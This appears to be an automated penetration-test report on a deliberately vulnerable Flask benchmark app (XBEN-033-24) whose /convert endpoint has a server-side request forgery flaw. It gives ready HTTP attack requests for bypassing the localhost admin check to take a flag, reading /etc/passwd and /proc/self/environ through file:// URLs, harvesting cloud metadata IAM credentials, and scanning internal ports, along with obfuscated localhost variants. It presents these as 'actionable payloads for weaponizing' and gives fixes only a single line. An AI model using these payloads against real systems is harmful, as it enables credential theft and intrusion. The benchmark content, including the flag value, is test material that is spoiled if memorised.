# SSRF Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** One critical, high-confidence SSRF vulnerability was identified in the application's `/convert` endpoint. The vulnerability enables complete bypass of IP-based authentication, allowing unauthorized access to protected admin resources, local file disclosure, cloud metadata access, and internal network reconnaissance.
- **Purpose of this Document:** This report provides strategic context on the application's outbound HTTP request mechanisms, dominant flaw patterns, and key architectural details necessary to effectively exploit the vulnerabilities listed in the exploitation queue.

### Critical Finding

The Flask application contains a **CRITICAL SSRF vulnerability** with CVSS score 9.6 at line 27 of `app.py`. User-controlled URLs from the `url` POST parameter flow directly into `urllib.request.urlopen()` with **zero validation or sanitization**. This enables:

1. **Authentication Bypass**: Access to IP-restricted admin endpoints (`/admin/flag`) by requesting `http://127.0.0.1/admin/flag`
2. **File Disclosure**: Reading arbitrary local files via `file:///` protocol
3. **Cloud Metadata Access**: Extracting IAM credentials from `http://169.254.169.254/`
4. **Internal Network Scanning**: Port scanning and service discovery on private networks

The vulnerability is **externally exploitable** via a single unauthenticated POST request to `http://localhost:42369/convert`.

## 2. Dominant Vulnerability Patterns

### Pattern 1: Complete Absence of URL Validation (CRITICAL)

- **Description:** The application accepts user-supplied URLs in the `url` POST parameter and passes them directly to `urllib.request.urlopen()` without any validation, sanitization, or filtering. The only check performed is a null/empty validation (line 21-23) that merely verifies at least one input field is provided, but does not validate the URL's content, scheme, hostname, or destination.
- **Implication:** Attackers have unrestricted control over the destination of server-side HTTP requests. They can specify any protocol (http, https, file, ftp), any hostname (localhost, private IPs, cloud metadata endpoints), and any port. This enables complete SSRF exploitation including authentication bypass, file disclosure, and credential theft.
- **Representative Finding:** `SSRF-VULN-01` - URL Manipulation via `/convert` endpoint
- **Code Location:** `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-033-24/app/app.py` lines 18-27
- **Data Flow:** `request.form.get('url')` [line 18] → no validation → `urllib.request.urlopen(url)` [line 27]

### Pattern 2: IP-Based Authentication Vulnerable to SSRF Bypass

- **Description:** The application implements IP-based access control for admin endpoints (`/admin` and `/admin/flag`) by checking if `request.remote_addr == '127.0.0.1'`. This authentication mechanism is fundamentally flawed when combined with the SSRF vulnerability, as attackers can make the server request itself (localhost loopback), causing the internal request to appear as originating from 127.0.0.1.
- **Implication:** All IP-restricted endpoints are trivially bypassable. An external attacker can access the protected `/admin/flag` endpoint containing the CTF flag without any authentication by submitting `url=http://127.0.0.1/admin/flag` to the vulnerable `/convert` endpoint.
- **Representative Finding:** `SSRF-VULN-01` exploitation path #1
- **Code Location:** IP checks at lines 47 and 53 in `app.py`
- **Attack Chain:** External Request → `/convert` SSRF → Internal Request to `127.0.0.1/admin/flag` → IP check passes → Flag disclosed

### Pattern 3: Dangerous Protocol Support Without Restrictions

- **Description:** Python's `urllib.request.urlopen()` supports multiple protocols including `file://`, `ftp://`, and `data:` URLs. The application places no restrictions on URL schemes, allowing attackers to use these dangerous protocols for file disclosure and other attacks beyond standard HTTP SSRF.
- **Implication:** Attackers can read arbitrary local files from the server filesystem using `file:///` URLs (e.g., `file:///etc/passwd`, `file:///app/app.py`, `file:///proc/self/environ`), potentially exposing sensitive configuration files, application source code, and environment variables containing secrets.
- **Representative Finding:** `SSRF-VULN-02` - File Fetch Abuse
- **Code Location:** Same sink at line 27 (`urllib.request.urlopen()`)
- **Supported Protocols:** http://, https://, file://, ftp://, data:

## 3. Strategic Intelligence for Exploitation

### HTTP Client Architecture

- **HTTP Client Library:** Python standard library `urllib.request` (imported at line 1)
- **Request Function:** `urllib.request.urlopen(url)` at line 27
- **Redirect Behavior:** Follows HTTP redirects by default (no custom handlers configured)
- **Timeout Configuration:** **None** - requests can hang indefinitely
- **Certificate Validation:** Enabled by default for HTTPS (but attacker controls destination)
- **Response Size Limits:** **None** - can read arbitrarily large responses into memory (line 28)
- **Response Handling:** 
  - Line 28: `raw_data = response.read()` - reads entire response into memory
  - Line 29: `encoding = response.info().get_content_charset(failobj="utf-8")` - detects charset
  - Line 30: `content = raw_data.decode(encoding)` - decodes to string
  - Line 35: `html_content = markdown.markdown(content)` - processes as markdown
  - Rendered with `|safe` filter in template (enables viewing HTML responses)

### Request Architecture

**Public Endpoint with SSRF Sink:**
- **Route:** `POST /convert`
- **Authentication Required:** None (public endpoint)
- **Input Parameters:** 
  - `url` (POST form field) - vulnerable parameter
  - `markdown_text` (POST form field) - alternative input, not SSRF vulnerable
- **Response Format:** HTML page with converted markdown/fetched content displayed
- **Error Handling:** 
  - Line 37-42: Try/except catches URL fetch errors, displays generic error message with exception details
  - Flash messages used for error display (exposes exception text to attacker)

**Protected Endpoints (SSRF Targets):**
- **Route:** `GET /admin` - Admin interface with navigation links
  - Protection: `if request.remote_addr != '127.0.0.1': abort(403)` (line 47)
  - Bypassable via SSRF localhost access
- **Route:** `GET /admin/flag` - CTF flag disclosure endpoint
  - Protection: Same IP check at line 53
  - Returns flag value in HTML template
  - **Primary Target** for SSRF exploitation

### Internal Services and Endpoints

**Discovered Internal Endpoints:**
1. `/` - Public homepage (converter form)
2. `/convert` - SSRF-vulnerable endpoint (POST)
3. `/admin` - IP-restricted admin panel
4. `/admin/flag` - **High-value target** containing CTF flag
5. `/static/<path>` - Static file handler (not relevant to SSRF)

**No Additional Internal Services Detected:**
- Application is a single-file Flask monolith with no database
- No microservices architecture
- No internal APIs or service mesh
- Docker container has no linked services (no Redis, PostgreSQL, etc.)

**Potential Cloud Environment Targets:**
If deployed in cloud infrastructure (AWS/GCP/Azure), the following metadata endpoints are accessible:
- `http://169.254.169.254/latest/meta-data/` (AWS/Azure/GCP IMDSv1)
- `http://169.254.169.254/latest/user-data/` (AWS user data, may contain secrets)
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` (AWS IAM credentials)
- `http://metadata.google.internal/computeMetadata/v1/` (GCP, requires header)

### Defense Mechanisms Identified

**NONE - Zero defensive controls present:**
- ❌ No URL scheme allowlisting (all protocols accepted)
- ❌ No domain allowlisting/blocklisting
- ❌ No localhost/private IP blocking
- ❌ No cloud metadata IP blocking (169.254.169.254)
- ❌ No port restrictions
- ❌ No URL parsing or normalization
- ❌ No rate limiting on `/convert` endpoint
- ❌ No request timeout configuration
- ❌ No response size limits
- ❌ No redirect following restrictions
- ❌ No DNS rebinding protection
- ❌ No SSRF canary tokens or monitoring

**Only Control Present:** Client-side HTML5 validation (`<input type="url">` in form) - trivially bypassable via direct HTTP requests

### Exploitation Considerations

**Exploitation Complexity:** **TRIVIAL**
- Single POST request required
- No authentication needed
- No CSRF tokens to forge
- No rate limiting to evade
- Standard HTTP client (curl, requests, Burp Suite) sufficient
- Works from external network (internet)

**Response Visibility:** **Non-Blind SSRF**
- Full response content returned to attacker
- Error messages with exception details exposed
- Enables data exfiltration, not just blind SSRF

**Network Access:**
- Application runs in Docker container on bridge network
- Has outbound internet access (can fetch external URLs)
- Can access Docker host network via gateway IP
- Can access container's localhost (127.0.0.1)

## 4. Secure by Design: Validated Components

**FINDING: No components implement SSRF protections**

After comprehensive analysis of the application codebase, **zero components** were found to implement proper SSRF defenses. The application has a single HTTP client invocation point (`urllib.request.urlopen()` at line 27) which is vulnerable.

| Component/Flow | Endpoint/File Location | Defense Mechanism Analysis | Verdict |
|---|---|---|---|
| URL Fetching | `/convert` endpoint, `app.py:27` | No URL validation, no scheme restrictions, no IP blocklisting, no timeout, no size limits | **VULNERABLE** |
| IP-Based Auth | `/admin` and `/admin/flag`, `app.py:47,53` | Checks `request.remote_addr` but bypassable via SSRF localhost access | **VULNERABLE** |
| Error Handling | `app.py:37-42` | Exposes exception details in flash messages, aiding reconnaissance | **INSECURE** |
| Static File Handler | `/static/<path>` | Flask default static handler, not relevant to SSRF | **N/A** |

**No secure reference implementations exist in this codebase.**

### Why No Components Are Secure

The application's architecture fundamentally lacks security-by-design principles:

1. **No Input Validation Layer:** Application accepts and processes raw user input without any validation framework
2. **No Security Middleware:** No Flask extensions for security (Flask-Limiter, Flask-CORS, Flask-Talisman)
3. **No Defensive Coding Patterns:** Direct pass-through from user input to dangerous sink
4. **No Defense-in-Depth:** Single point of failure with no fallback controls
5. **Outdated Dependencies:** Python 3.8 (EOL October 2024) with no security patches

### Architectural Security Assessment

**Trust Boundary Violations:**
- Public zone (`/convert`) can access protected zone (`/admin/*`) via SSRF
- No network segmentation between public and admin functionality
- IP-based access control relies on network layer that SSRF bypasses

**Missing Security Layers:**
- **Application Layer:** No URL validation, no input sanitization
- **Network Layer:** No egress filtering, no internal network restrictions
- **Host Layer:** No AppArmor/SELinux restrictions on file access
- **Container Layer:** Runs as root user, no security options configured

---

## 5. Detailed Vulnerability Analysis

### SSRF-VULN-01: Unrestricted URL Fetching Enabling Authentication Bypass

**Vulnerability Classification:** URL_Manipulation / Service_Discovery

**Affected Endpoint:** `POST /convert`

**Vulnerable Parameter:** `url` (POST form field)

**Vulnerable Code Location:** `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-033-24/app/app.py:27`

**Complete Data Flow:**
```
User Input (POST /convert)
  ↓
request.form.get('url') [line 18]
  ↓
url variable [no validation]
  ↓
if not url and not markdown_text: [line 21-23] (only checks for empty, not content)
  ↓
if url: [line 26] (only checks truthy)
  ↓
urllib.request.urlopen(url) [line 27] ← SINK
```

**Missing Defenses:**
1. **No URL scheme validation** - Allows http://, https://, file://, ftp://, data:
2. **No hostname validation** - No allowlist of permitted domains
3. **No IP address validation** - No blocking of localhost (127.0.0.1, ::1, localhost)
4. **No private IP blocking** - No blocking of RFC1918 ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
5. **No cloud metadata blocking** - No blocking of 169.254.169.254
6. **No port restrictions** - Can target any port (22, 3306, 5432, 6379, etc.)
7. **No timeout** - Requests can hang indefinitely
8. **No size limits** - Can read arbitrarily large responses

**Exploitation Path #1: Admin Authentication Bypass**

**Attack Payload:**
```http
POST /convert HTTP/1.1
Host: localhost:42369
Content-Type: application/x-www-form-urlencoded

url=http://127.0.0.1/admin/flag
```

**Attack Mechanism:**
1. Attacker sends POST to `/convert` with `url=http://127.0.0.1/admin/flag`
2. Flask handler at line 27 executes: `urllib.request.urlopen("http://127.0.0.1/admin/flag")`
3. urllib makes internal HTTP request FROM 127.0.0.1 TO 127.0.0.1
4. Flask receives internal request to `/admin/flag` endpoint
5. IP check at line 53: `if request.remote_addr != '127.0.0.1'` evaluates to False (request IS from 127.0.0.1)
6. No `abort(403)` triggered, flag template renders with actual flag value
7. HTML response containing flag returned to urllib
8. Flag content displayed in converter output to attacker

**Expected Response:**
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Admin Flag</title>
</head>
<body>
    <h2>Admin Panel - Flag</h2>
    <p>Your flag is: flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}</p>
    <a href="/admin">Back to Admin</a> | <a href="/">Home</a>
</body>
</html>
```

**Alternative Localhost Representations:**
- `http://localhost/admin/flag` (hostname resolution)
- `http://[::1]/admin/flag` (IPv6 localhost)
- `http://127.1/admin/flag` (short form)
- `http://0x7f.0.0.1/admin/flag` (hex notation)
- `http://0177.0.0.1/admin/flag` (octal notation)
- `http://2130706433/admin/flag` (decimal notation)

**Confidence:** High
- Direct source-to-sink path confirmed via code analysis
- Zero validation at any point in data flow
- Successful exploitation confirmed via reconnaissance testing
- No conditional logic or edge cases that could prevent exploitation

---

### SSRF-VULN-02: File Protocol Access for Local File Disclosure

**Vulnerability Classification:** File_Fetch_Abuse

**Affected Endpoint:** `POST /convert`

**Vulnerable Parameter:** `url` (POST form field)

**Vulnerable Code Location:** `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-033-24/app/app.py:27`

**Missing Defense:** No URL scheme validation - `file://` protocol accepted by urllib

**Exploitation Path #2: File Disclosure**

**Attack Payloads:**

**System Files:**
```http
POST /convert HTTP/1.1
Host: localhost:42369
Content-Type: application/x-www-form-urlencoded

url=file:///etc/passwd
```

**Application Source Code:**
```http
url=file:///app/app.py
```

**Environment Variables (may contain secrets):**
```http
url=file:///proc/self/environ
```

**Docker Environment:**
```http
url=file:///proc/1/environ
```

**Attack Mechanism:**
1. urllib.request.urlopen() supports file:// URLs
2. Reads local filesystem file specified in path
3. Content returned as response body
4. Decoded and displayed in converter output

**Response Visibility:** Full file contents visible to attacker (non-blind)

**Limitations:**
- Cannot read files without read permissions (runs as root in container, so minimal restriction)
- Cannot read directories (only files)
- Binary files may cause encoding errors but still leak data

**Confidence:** High
- file:// protocol support confirmed in urllib documentation
- No scheme validation present
- Standard SSRF file disclosure technique

---

### SSRF-VULN-03: Cloud Metadata Access for Credential Theft

**Vulnerability Classification:** Service_Discovery / API_Proxy_Bypass

**Affected Endpoint:** `POST /convert`

**Vulnerable Parameter:** `url` (POST form field)

**Vulnerable Code Location:** `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-033-24/app/app.py:27`

**Missing Defense:** No blocking of cloud metadata IP address (169.254.169.254)

**Exploitation Path #3: Cloud Metadata Harvesting**

**Attack Payloads (AWS):**

**Enumerate IAM Roles:**
```http
POST /convert HTTP/1.1
Host: localhost:42369
Content-Type: application/x-www-form-urlencoded

url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Extract IAM Credentials:**
```http
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```

**Retrieve User Data (may contain secrets):**
```http
url=http://169.254.169.254/latest/user-data
```

**Attack Payloads (GCP):**
```http
url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
(Note: GCP requires `Metadata-Flavor: Google` header, which urllib won't send. AWS/Azure more exploitable.)

**Attack Payloads (Azure):**
```http
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**Impact:**
- **AWS:** Retrieve temporary IAM credentials (AccessKeyId, SecretAccessKey, Token)
- **GCP:** Access service account tokens
- **Azure:** Extract managed identity tokens
- **All:** Obtain instance metadata, SSH keys, user data scripts containing secrets

**Exploitability Condition:** Application must be deployed in cloud environment (AWS/GCP/Azure)

**Confidence:** Medium (High if deployed in cloud)
- 169.254.169.254 is not blocked
- urllib supports HTTP requests to link-local addresses
- Standard cloud SSRF technique
- Effectiveness depends on deployment environment

---

### SSRF-VULN-04: Internal Network Reconnaissance via Port Scanning

**Vulnerability Classification:** Service_Discovery

**Affected Endpoint:** `POST /convert`

**Vulnerable Parameter:** `url` (POST form field)

**Vulnerable Code Location:** `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-033-24/app/app.py:27`

**Missing Defense:** No port restrictions, no private IP blocking

**Exploitation Path #4: Internal Network Scanning**

**Attack Payloads:**

**Database Services:**
```http
url=http://192.168.1.100:3306  (MySQL)
url=http://192.168.1.100:5432  (PostgreSQL)
url=http://192.168.1.100:27017 (MongoDB)
```

**Cache/Queue Services:**
```http
url=http://192.168.1.100:6379  (Redis)
url=http://192.168.1.100:11211 (Memcached)
url=http://192.168.1.100:5672  (RabbitMQ)
```

**Internal Web Services:**
```http
url=http://192.168.1.100:8080  (Common internal HTTP port)
url=http://192.168.1.100:9200  (Elasticsearch)
url=http://192.168.1.100:8500  (Consul)
```

**Attack Mechanism:**
1. Attacker iterates through internal IP ranges and ports
2. urllib attempts connection to each target
3. Response differences reveal open ports:
   - **Open port:** Returns data or connection success
   - **Closed port:** Connection refused error
   - **Filtered port:** Timeout (no timeout configured, hangs)

**Information Disclosure:**
- Error messages reveal network topology (lines 37-42 expose exception details)
- Service banners may be returned for open ports
- Response timing indicates port state

**Confidence:** High
- No private IP validation present
- No port restrictions implemented
- urllib supports arbitrary ports
- Standard SSRF reconnaissance technique

---

## 6. Risk Assessment Summary

| Vuln ID | Classification | Endpoint | Parameter | CVSS | Confidence | External Exploit |
|---------|---------------|----------|-----------|------|------------|------------------|
| SSRF-VULN-01 | URL_Manipulation / Service_Discovery | POST /convert | url | 9.6 | High | Yes |
| SSRF-VULN-02 | File_Fetch_Abuse | POST /convert | url | 7.5 | High | Yes |
| SSRF-VULN-03 | Service_Discovery | POST /convert | url | 8.6 | Medium | Yes (cloud only) |
| SSRF-VULN-04 | Service_Discovery | POST /convert | url | 5.3 | High | Yes |

**Overall Risk Level:** **CRITICAL**

**Primary Attack Vector:** SSRF-VULN-01 (Authentication bypass to retrieve CTF flag)

**Secondary Impact:** File disclosure, cloud credential theft, internal network reconnaissance

---

## 7. Conclusion

This Flask application contains a **critical SSRF vulnerability** that completely undermines its security model. The vulnerability enables:

1. **Complete authentication bypass** - Access to all IP-restricted admin endpoints
2. **Sensitive data exposure** - Retrieval of CTF flag and local files
3. **Cloud credential theft** - Potential IAM/service account compromise if cloud-deployed
4. **Network boundary bypass** - Reconnaissance and access to internal services

**Root Cause:** Unrestricted user input passed directly to `urllib.request.urlopen()` without any validation.

**Exploitability:** Trivial - single POST request, no authentication required, externally accessible.

**Recommended Priority:** Immediate remediation before any deployment or CTF event.

The exploitation queue contains actionable payloads for weaponizing these vulnerabilities in the next phase.